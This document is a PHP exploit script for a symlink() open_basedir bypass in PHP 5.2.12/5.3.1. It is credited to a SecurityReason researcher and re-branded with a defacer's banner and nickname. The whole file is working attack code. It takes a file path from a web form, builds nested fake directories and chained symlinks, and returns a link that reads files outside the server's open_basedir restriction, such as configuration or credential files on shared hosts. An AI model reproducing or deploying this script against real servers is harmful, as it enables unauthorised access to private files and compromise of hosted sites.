 <?php 
/* 
PHP 5.2.12/5.3.1 symlink() open_basedir bypass 
by Maksymilian Arciemowicz http://securityreason.com/ 
cxib [ a.T] securityreason [ d0t] com 
  
CHUJWAMWMUZG 
*/ 
  
$fakedir="cx"; 
$fakedep=16; 
  
$num=0; // offset of symlink.$num 
  
if(!empty($_GET['file'])) $file=$_GET['file']; 
else if(!empty($_POST['file'])) $file=$_POST['file']; 
else $file=""; 
  
echo '<PRE><img src="http://thanggiangho.winterhost.org/tgh.jpeg"><P>
Thanggiangho-ceh-vmt-xgr-hce-vhk...
<p>Thanggiangho
<p>Nick <a href="http://thanggiangho.winterhost.org">mochilamo2000</a> 
<p><form name="form" 
 action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["PHP_SELF"]).'" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hym" value="Thanggiangho"></form>'; 
  
if(empty($file)) 
    exit; 
  
if(!is_writable(".")) 
    die("not writable directory"); 
  
$level=0; 
  
for($as=0;$as<$fakedep;$as++){ 
    if(!file_exists($fakedir)) 
        mkdir($fakedir); 
    chdir($fakedir); 
} 
  
while(1<$as--) chdir(".."); 
  
$hardstyle = explode("/", $file); 
  
for($a=0;$a<count($hardstyle);$a++){ 
    if(!empty($hardstyle[$a])){ 
        if(!file_exists($hardstyle[$a])) 
            mkdir($hardstyle[$a]); 
        chdir($hardstyle[$a]); 
        $as++; 
    } 
} 
$as++; 
while($as--) 
    chdir(".."); 
  
@rmdir("fakesymlink"); 
@unlink("fakesymlink"); 
  
@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink"); 
  
// this loop will skip allready created symlinks. 
while(1) 
    if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break; 
    else $num++; 
  
@unlink("fakesymlink"); 
mkdir("fakesymlink"); 
  
die('<FONT COLOR="RED">check symlink <a href="./symlink'.$num.'">symlink'.$num.'</a> file</FONT>'); 
  
?>